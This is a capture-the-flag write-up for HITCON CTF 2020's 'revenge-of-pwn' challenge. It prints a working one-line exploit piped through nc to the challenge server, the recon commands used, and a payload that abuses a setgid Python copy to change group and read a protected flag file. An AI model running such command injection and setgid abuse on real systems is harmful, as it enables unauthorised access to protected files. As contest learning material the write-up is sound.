# revenge-of-pwn

> Have you ever thought those challenges you pwned may retaliate someday? nc 3.115.58.219 9427 revenge_of_pwn-255196bb99d75512732a4109f154103b4bc428e6e29e2cdcc69e44aee67ea75f.tar.gz

Categories:
* misc
* pwn

## Solution

```
$ printf $'131\n/home/deploy/secret_python_others_should_never_know -c \'__import__("os").setgid(1001);print(open("/home/deploy/flag").read())\' 1>&2\n' | nc 3.115.58.219 9427
ELF size? (MAX: 6144)
[*] Version of pwntools: 4.3.0
[x] Opening connection to 127.0.0.1 on port 1337
[x] Opening connection to 127.0.0.1 on port 1337: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 1337: Done
hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
```

## Explanation

So basically I think we were supposed to [abuse pwntools `asm` function](https://github.com/FrenchRoomba/ctf-writeup-HITCON-CTF-2020/blob/master/revenge-of-pwn/README.md), but I'm pretty lazy

Since we basiclaly have a shell by sending `len(cmd) + "\n" + cmd` to the socket (it executes non-ELF without shebang as `bash`), I explored a little first:

```
$ ls -lah $HOME
-rwxr-sr-x 1 root exploiter 5.3M Nov 26 05:07 /home/deploy/secret_python_others_should_never_know
-rw-r----- 1 root exploiter 43 Nov 24 14:58 /home/deploy/flag
```

The setgid bit is set on `secret_python_others_should_never_know`, and it's owned by `exploiter`--and so is the flag! 

```
$ cat /etc/passwd | grep exploiter
exploiter:x:1001:1001:,,,:/home/exploiter:/bin/bash
```

So now we just run `secret_python_others_should_never_know` which is basically a copy of the `python3` binary:

```
import os
os.setgid(1001)
os.system('cat /home/deploy/flag')
```

(^ expanded payload)

